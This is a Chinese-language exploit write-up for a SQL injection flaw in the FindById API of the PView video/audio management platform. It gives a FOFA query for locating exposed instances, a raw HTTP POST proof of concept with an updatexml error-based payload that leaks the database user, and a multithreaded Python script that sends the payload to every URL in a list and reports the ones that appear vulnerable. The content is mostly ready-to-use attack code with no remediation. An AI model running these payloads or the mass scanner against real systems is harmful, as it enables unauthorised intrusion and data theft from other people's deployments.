# 誉龙视音频综合管理平台FindById存在SQL注入漏洞

存在一个API接口，该接口接收一个名为`id`的参数。当`id`参数设置为特定的SQL注入payload时，应用程序没有正确地过滤或转义输入，导致直接将恶意SQL代码执行。

fofa：

```
body="PView 视音频管理平台"
```

poc：

```
POST /index.php?r=RelMedia/FindById HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

id=1+and+updatexml(1,concat(0x7e,user(),0x7e),1)--+
```

批量检测脚本：

```
import requests
import concurrent.futures
import time
from urllib.parse import urlparse, urlunparse

# 读取URL列表
def read_urls(filename):
    with open(filename, 'r') as file:
        urls = file.readlines()
    urls = [url.strip() for url in urls if url.strip()]
    return urls

# 检查URL是否包含协议头，如果没有则添加
def ensure_protocol(url):
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        parsed_url = parsed_url._replace(scheme='http')
    return urlunparse(parsed_url)

# 发送POST请求并检测响应
def test_url(url):
    try:
        # 构建完整的URL
        full_url = f"{ensure_protocol(url)}/index.php?r=RelMedia/FindById"
        
        # 请求头
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # 请求数据
        data = {
            'id': '1+and+updatexml(1,concat(0x7e,user(),0x7e),1)--+'
        }
        
        # 发送POST请求
        response = requests.post(full_url, headers=headers, data=data, timeout=4)
        
        # 检测响应状态码
        if response.status_code == 200:
            # 检测响应内容是否包含注入结果
            if '~' in response.text:
                print(f"[+]可能存在漏洞的url: {full_url}")
                return full_url
            else:
                print(f"Safe URL: {full_url} (Status Code: {response.status_code})")
                return None
        else:
            print(f"Safe URL: {full_url} (Status Code: {response.status_code})")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error testing URL: {url} - {e}")
        return None

# 主函数
def main():
    start_time = time.time()
    
    # 读取URL列表
    urls = read_urls('url.txt')
    
    # 多线程扫描
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(test_url, urls))
    
    # 过滤出有漏洞的URL
    vulnerable_urls = [url for url in results if url]
    
    # 输出有漏洞的URL
    if vulnerable_urls:
        print("\n[+]可能存在漏洞的url")
        for url in vulnerable_urls:
            print(url)
    else:
        print("error")
    
    end_time = time.time()
    print(f"Scanning completed in {end_time - start_time:.2f} seconds")

if __name__ == "__main__":
    main()
```

